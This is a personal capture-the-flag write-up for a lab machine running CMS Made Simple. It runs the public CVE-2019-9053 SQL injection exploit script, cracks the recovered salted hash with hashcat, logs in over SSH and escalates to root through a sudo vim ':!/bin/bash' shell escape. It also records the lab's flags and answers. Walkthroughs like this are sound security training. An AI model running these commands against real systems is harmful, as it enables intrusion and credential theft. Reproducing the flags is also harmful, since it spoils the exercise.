#########

# I.P : 10.10.206.126

# 2 ports: 21 and 80

#port 2222 is running ssh

cms version <= 2.2.9 is vulnerable to SQL Injection

# 4. What's the CVE you're using against the application?

https://www.cvedetails.com/cve/CVE-2019-9053/

CVE-2019-9053

using searchspolit with:

searchsploit cms made simple 2.2.8

found it is vulnerable to SQL Injection

ran the following command:

python /usr/share/exploitdb/exploits/php/webapps/46635.py -u http://10.10.231.208/simple --crack -w /usr/share/wordlists/dirbuster-ng/wordlists/big.txt 
got the credentials:

[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96

used hashcat with the following command:
hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt --force


found the password after using --show option with the above cmd :
secret..
# 5. whats the password?

secret

# 6. What am i using to get into the system?

ssh
used ssh mitch@$IP -p 2222
after logging in i got the user flag
got the user flag : G00d j0b, keep up!

# 7. user flag...

# 8. which other user did i find?
did cd .. followed by ls
sunbath.

# 9. which config error did i find:
did sudo -l and found that i have vim tool.

used vim user.txt and 
entered:
:!/bin/bash
got a shell with root previlages... :) (Did all of that all by myself so proud xD)

cd /root
then ls then cat root.txt

# 10. found the user flag:

W3ll d0n3. You made it!